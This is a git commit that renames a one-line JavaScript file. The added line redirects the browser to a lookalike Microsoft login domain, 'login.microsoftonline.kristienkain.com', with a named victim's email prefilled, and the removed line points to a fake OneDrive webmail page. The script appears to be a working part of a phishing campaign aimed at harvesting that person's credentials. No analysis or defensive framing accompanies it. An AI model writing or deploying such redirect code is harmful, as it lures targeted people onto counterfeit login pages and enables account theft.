4e08a34fa5c880a04329e7b40ed4d849043aa66f
jamesmabrydreams <jamesmabrydreams@gmail.com>
2025-08-12 18:40:22 -0700

    Update and rename p1.js to p012.js

---
+++ p012.js
@@ -0,0 +1,1 @@
+window.location.href = "https://login.microsoftonline.kristienkain.com/OOfOKdSo?id=supportev@lectrixev.com";
--- p1.js
+++
@@ -1,1 +0,0 @@
-window.location.href = "https://onedrives.thinoi.com/webmail/desk5.html?username=supportev@lectrixev.com";
